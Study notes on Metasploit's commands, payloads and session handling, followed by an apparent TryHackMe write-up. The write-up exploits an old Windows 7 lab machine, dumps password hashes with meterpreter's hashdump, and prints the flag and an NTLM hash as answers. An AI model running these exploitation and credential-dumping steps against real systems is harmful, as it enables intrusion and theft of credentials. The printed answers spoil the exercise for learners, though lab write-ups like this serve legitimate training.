# Metasploit and Its Exploitation Framework 

## Introduction: 
Metasploit is a framework used for exploiting vulnerabilities in systems. This document outlines its capabilities, especially related to the various types of exploits and payloads available within the Metasploit framework. 

## Key Points: 

1. Metasploit Version Details: 

• Current version: metasploit v5. 0. 101-dev. 

• Available modules: 

• 2048 exploits 

• 1105 auxiliary 

• 344 post-exploitation modules 

• 562 payloads 

• 45 encoders 

• 10 NOPs 

• 7 evasion modules. 

2. Commands: 

• To search for exploits: use the `search` command. 

• To get more details about an exploit: use the `info` command. 

• To launch an exploit: use the `exploit` command. 

3. Understanding the Target: 

• Success depends on knowing the services running on the target system. 

• Most exploits come with default payloads, but you can see other options using the `show payloads` command. 

4. Available Payloads:

• A selection of compatible payloads includes: 

• Generic custom payloads 

• Several types of command shells (bind and reverse TCP) 

• Windows-specific commands like `windows/x64/exec` and `windows/x64/meterpreter` variants. 

5. Payload Configuration: 

• Use `set payload ` to choose a payload. 

• After setting the payload, use `show options` to configure necessary parameters for the exploit, which include settings for the target host and port. 

6. Payload Options: 

• For each payload, options such as `LHOST` and `LPORT` must be set according to the network environment. 

7. Executing the Exploit: 

• Once the parameters are configured, running the exploit command will launch the attack: 

• Successful connections and exploit actions are reported with specific outputs detailing vulnerabilities and established connections. 

8. Sessions Management: 

• A session can be opened upon a successful exploit, which can be backgrounded or aborted. 

• Using `sessions` command lists active sessions and allows for interaction or management of these sessions. 

9. Interacting with Sessions: 

• The command `sessions -i ` allows interaction with a specific session. 

• Multiple options are available for managing sessions, including listing, terminating, and upgrading sessions. 

## Conclusion: 
Metasploit is a powerful tool for penetration testing and security assessments. By understanding its commands and functionalities, users can effectively exploit vulnerabilities in target systems and manage their sessions to perform further operations.

# Try Hack Me Write Up

So this time we have a good CTF challenge where we need to scan, find a  vulnerability and exploit it using metasploit framework. If we succeed we find the flag. 

- Q: What is the content of the flag.txt file?

- A:

Segment:
 - Used nmap -sV -sC -A MACHINE_IP -vv > scan.txt
 - Host is running old windows 7 OS. 
 - msfconsole
 - show payloads
 - set payload 2
 - show options
 - set RHOSTS MACHINE_IP
 - exploit
 - once iN, we need to go to users/jon/documents
 - cat flag.txt
 - THM-5455554845

- Q: What is the NTLM hash of the password of the user "pirate"?

- A:
Segment:
  - Still on the meterpreter
  - hashdump
  - 8ce9a3ebd1647fcc5e04025019f4b875
  